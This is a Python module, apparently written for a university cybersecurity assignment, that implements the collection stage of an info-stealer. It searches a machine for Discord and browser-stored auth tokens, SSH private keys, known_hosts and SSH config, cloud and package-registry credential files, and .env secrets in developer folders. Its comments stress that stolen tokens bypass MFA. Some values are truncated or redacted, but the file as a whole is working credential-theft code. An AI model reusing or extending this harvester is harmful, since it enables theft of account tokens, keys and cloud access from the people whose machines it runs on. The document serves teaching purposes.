"""
Token & Secret Harvester Module
MITRE ATT&CK: T1528 (Steal Application Access Token)
                T1552.001 (Unsecured Credentials: Credentials In Files)
                T1555.005 (Credentials from Password Stores: Password Managers)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Searches for high-value secrets that applications store on disk:
  1. Discord tokens (LevelDB + browser localStorage)
  2. SSH private keys (~/.ssh/)
  3. Cloud CLI credentials (AWS, Azure, GCP)
  4. .env files with API keys
  5. Git credentials (.git-credentials)

Real-world usage: Modern info-stealers (RedLine, Lumma, Vidar) prioritize
these over browser passwords because tokens bypass MFA entirely.
"""

import os
import re
import json
import glob
import base64


def harvest_discord_tokens():
    """
    Extract Discord authentication tokens from local storage.

    Discord stores tokens in LevelDB databases inside:
      - Discord app: %APPDATA%/discord/Local Storage/leveldb/
      - Chrome: stored as cookie/localStorage for discord.com
      - Other clients: discordcanary, discordptb

    A valid token grants full account access — messages, servers, payment info.
    This bypasses 2FA because the session is already authenticated.

    Returns:
        list of dicts: [{source, token_preview, token_length}]
    """
    tokens = []
    appdata = os.environ.get("APPDATA", "")
    local_appdata = os.environ.get("LOCALAPPDATA", "")

    # Paths where Discord stores LevelDB data
    discord_paths = {
        "Discord": os.path.join(appdata, "discord", "Local Storage", "leveldb"),
        "Discord Canary": os.path.join(appdata, "discordcanary", "Local Storage", "leveldb"),
        "Discord PTB": os.path.join(appdata, "discordptb", "Local Storage", "leveldb"),
        "Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        "Edge": os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
        "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
        "Opera": os.path.join(appdata, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
    }

    # Token patterns:
    #   - Regular token: base64-ish string
    #   - MFA token: starts with "mfa."
    #   - Bot token: starts with a number (user ID)
    token_pattern = re.compile(r'[\w-]{24,}\.[\w-]{6}\.[\w-]{27,}|mfa\.[\w-]{84}')

    for source, path in discord_paths.items():
        if not os.path.isdir(path):
            continue

        for filename in os.listdir(path):
            if not filename.endswith((".log", ".ldb")):
                continue

            filepath = os.path.join(path, filename)
            try:
                with open(filepath, "r", errors="ignore") as f:
                    content = f.read()

                for match in token_pattern.finditer(content):
                    token = match.group()
                    # Deduplicate
                    if not any(t["token_preview"] == token[:20] for t in tokens):
                        tokens.append({
                            "source": source,
                            "token_preview": token[:20] + "...",
                            "token_length": len(token),
                            "is_mfa": token.startswith("mfa."),
                        })
            except Exception:
                continue

    return tokens


def harvest_ssh_keys():
    """
    Find SSH private keys in the user's .ssh directory.

    SSH keys are high-value targets — a single key can grant access to:
      - Cloud VMs (AWS EC2, Azure, GCP)
      - Git repositories (GitHub, GitLab)
      - Internal servers
      - CI/CD pipelines

    Returns:
        list of dicts: [{path, filename, type, has_passphrase, size_bytes}]
    """
    keys = []
    ssh_dir = os.path.join(os.path.expanduser("~"), ".ssh")

    if not os.path.isdir(ssh_dir):
        return keys

    for filename in os.listdir(ssh_dir):
        filepath = os.path.join(ssh_dir, filename)
        if not os.path.isfile(filepath):
            continue

        try:
            with open(filepath, "r", errors="ignore") as f:
                content = f.read(2048)  # First 2KB is enough to identify

            key_type = None
            has_passphrase = False

            if "BEGIN RSA PRIVATE KEY" in content:
                key_type = "RSA"
                has_passphrase = "ENCRYPTED" in content
            elif "BEGIN OPENSSH PRIVATE KEY" in content:
                key_type = "OpenSSH"
                # OpenSSH format: check if encrypted by looking for bcrypt
                has_passphrase = "bcrypt" in content
            elif "BEGIN EC PRIVATE KEY" in content:
                key_type = "ECDSA"
                has_passphrase = "ENCRYPTED" in content
            elif "BEGIN DSA PRIVATE KEY" in content:
                key_type = "DSA"
                has_passphrase = "ENCRYPTED" in content
            elif "BEGIN PGP PRIVATE KEY" in content:
                key_type = "PGP"

            if key_type:
                keys.append({
                    "path": filepath,
                    "filename": filename,
                    "type": key_type,
                    "has_passphrase": has_passphrase,
                    "size_bytes": os.path.getsize(filepath),
                })

                # Also check for authorized_keys and known_hosts (recon value)
            elif filename == "known_hosts":
                # Parse known_hosts for server inventory
                hosts = []
                for line in content.split("\n"):
                    line = line.strip()
                    if line and not line.startswith("#"):
                        host = line.split()[0] if line.split() else ""
                        if host:
                            hosts.append(host)
                if hosts:
                    keys.append({
                        "path": filepath,
                        "filename": filename,
                        "type": "known_hosts",
                        "has_passphrase": False,
                        "size_bytes": os.path.getsize(filepath),
                        "known_hosts_count": len(hosts),
                        "hosts_preview": hosts[:10],
                    })
            elif filename == "config":
                # SSH config reveals server aliases, jump hosts, proxy commands
                keys.append({
                    "path": filepath,
                    "filename": filename,
                    "type": "ssh_config",
                    "has_passphrase": False,
                    "size_bytes": os.path.getsize(filepath),
                    "content_preview": content[:500],
                })

        except Exception:
            continue

    return keys


def harvest_cloud_credentials():
    """
    Find cloud CLI credentials stored on disk.

    Cloud CLIs store credentials in well-known paths:
      - AWS: ~/.aws/credentials (access key + secret key)
      - Azure: ~/.azure/msal_token_cache.json (OAuth tokens)
      - GCP: ~/.config/gcloud/credentials.db (SQLite with tokens)
      - Kubernetes: ~/.kube/config (cluster access)

    A single AWS key can cost an org $100K+ in crypto mining charges.

    Returns:
        list of dicts: [{provider, path, exists, preview}]
    """
    home = os.path.expanduser("~")
    creds = []

    cloud_paths = {
        "AWS CLI": os.path.join(home, ".aws", "credentials"),
        "AWS Config": os.path.join(home, ".aws", "config"),
        "Azure Token Cache": os.path.join(home, ".azure", "msal_token_cache.json"),
        "Azure Profile": os.path.join(home, ".azure", "azureProfile.json"),
        "GCP Credentials": os.path.join(home, ".config", "gcloud", "application_default_credentials.json"),
        "GCP Properties": os.path.join(home, ".config", "gcloud", "properties"),
        "Kubernetes Config": os.path.join(home, ".kube", "config"),
        "Docker Config": os.path.join(home, ".docker", "config.json"),
        "Git Credentials": os.path.join(home, ".git-credentials"),
        "NPM Token": os.path.join(home, ".npmrc"),
        "PyPI Token": os.path.join(home, ".pypirc"),
        "Terraform Creds": os.path.join(home, ".terraform.d", "credentials.tfrc.json"),
    }

    for provider, path in cloud_paths.items():
        if os.path.isfile(path):
            try:
                size = os.path.getsize(path)
                with open(path, "r", errors="ignore") as f:
                    preview = f.read(300)

                # Redact actual secrets for safety but show structure
                creds.append({
                    "provider": provider,
                    "path": path,
                    "exists": True,
                    "size_bytes": size,
                    "preview": _redact_secrets(preview),
                })
            except Exception:
                creds.append({
                    "provider": provider,
                    "path": path,
                    "exists": True,
                    "size_bytes": 0,
                    "preview": "[could not read]",
                })

    return creds


def harvest_env_files():
    """
    Search common locations for .env files containing API keys.

    Developers frequently leave .env files with:
      - Database passwords
      - API keys (Stripe, SendGrid, Twilio, etc.)
      - JWT secrets
      - OAuth client secrets

    Returns:
        list of dicts: [{path, secrets_found}]
    """
    home = os.path.expanduser("~")
    results = []

    # Common developer directories
    search_dirs = [
        os.path.join(home, "Desktop"),
        os.path.join(home, "Documents"),
        os.path.join(home, "Downloads"),
        os.path.join(home, "Projects"),
        os.path.join(home, "repos"),
        os.path.join(home, "code"),
        os.path.join(home, "dev"),
    ]

    # Patterns that indicate secrets
    secret_patterns = [
        re.compile(r'(?:API[_-]?KEY|SECRET[_-]?KEY|ACCESS[_-]?KEY|TOKEN|PASSWORD|PRIVATE[_-]?KEY)\s*[=:]\s*["\']?(\S+)', re.IGNORECASE),
    ]

    for search_dir in search_dirs:
        if not os.path.isdir(search_dir):
            continue

        # Walk max 3 levels deep to avoid scanning forever
        for root, dirs, files in os.walk(search_dir):
            depth = root.replace(search_dir, "").count(os.sep)
            if depth > 3:
                dirs.clear()
                continue

            # Skip node_modules, .git, venv, etc.
            dirs[:] = [d for d in dirs if d not in {
                "node_modules", ".git", "__pycache__", "venv", ".venv",
                "env", ".env", "vendor", "dist", "build"
            }]

            for filename in files:
                if filename in {".env", ".env.local", ".env.production", ".env.development"}:
                    filepath = os.path.join(root, filename)
                    try:
                        with open(filepath, "r", errors="ignore") as f:
                            content = f.read(4096)

                        secrets_found = []
                        for pattern in secret_patterns:
                            for match in pattern.finditer(content):
                                key_val = match.group()
                                # Show the key name but redact the value
                                eq_pos = max(key_val.find("="), key_val.find(":"))
                                if eq_pos > 0:
                                    key_name = key_val[:eq_pos].strip()
                                    secrets_found.append(key_name)

                        results.append({
                            "path": filepath,
                            "size_bytes": os.path.getsize(filepath),
                            "secrets_found": secrets_found,
                            "total_lines": content.count("\n") + 1,
                        })
                    except Exception:
                        continue

    return results


def _redact_secrets(text):
    """Redact actual secret values but keep structure visible."""
    # Redact AWS keys
    text = re.sub(
        r'(aws_secret_access_key\s*=\s*)\S+',
        r'\1[REDACTED]', text, flags=re.IGNORECASE
    )
    text = re.sub(
        r'(aws_access_key_id\s*=\s*)\S+',
        r'\1[REDACTED]', text, flags=re.IGNORECASE
    )
    # Redact generic tokens/passwords
    text = re.sub(
        r'((?:token|password|secret|key)\s*[=:"]+\s*)[^\s",}]+',
        r'\1[REDACTED]', text, flags=re.IGNORECASE
    )
    return text


def harvest_all():
    """
    Run all harvesters and return a combined report.

    Returns:
        dict with all findings categorized
    """
    discord = harvest_discord_tokens()
    ssh = harvest_ssh_keys()
    cloud = harvest_cloud_credentials()
    envs = harvest_env_files()

    return {
        "discord_tokens": discord,
        "ssh_keys": ssh,
        "cloud_credentials": cloud,
        "env_files": envs,
        "summary": {
            "discord_tokens_found": len(discord),
            "ssh_keys_found": len([k for k in ssh if k["type"] not in ("known_hosts", "ssh_config")]),
            "cloud_cred_files": len(cloud),
            "env_files_found": len(envs),
        }
    }


if __name__ == "__main__":
    print("=" * 50)
    print("  Token & Secret Harvester Test")
    print("  T1528 + T1552.001")
    print("=" * 50)

    # Discord
    tokens = harvest_discord_tokens()
    print(f"\n[{'+'if tokens else '-'}] Discord tokens: {len(tokens)} found")
    for t in tokens:
        print(f"    Source: {t['source']}, Preview: {t['token_preview']}, MFA: {t['is_mfa']}")

    # SSH
    keys = harvest_ssh_keys()
    print(f"\n[{'+'if keys else '-'}] SSH artifacts: {len(keys)} found")
    for k in keys:
        passphrase = "ENCRYPTED" if k.get("has_passphrase") else "NO PASSPHRASE"
        if k["type"] in ("known_hosts", "ssh_config"):
            print(f"    {k['filename']} ({k['type']})")
        else:
            print(f"    {k['filename']} ({k['type']}, {passphrase})")

    # Cloud
    creds = harvest_cloud_credentials()
    print(f"\n[{'+'if creds else '-'}] Cloud credential files: {len(creds)} found")
    for c in creds:
        print(f"    {c['provider']}: {c['path']}")

    # Env files
    envs = harvest_env_files()
    print(f"\n[{'+'if envs else '-'}] .env files: {len(envs)} found")
    for e in envs:
        secrets = ", ".join(e["secrets_found"][:5]) if e["secrets_found"] else "(no secrets detected)"
        print(f"    {e['path']} — {secrets}")
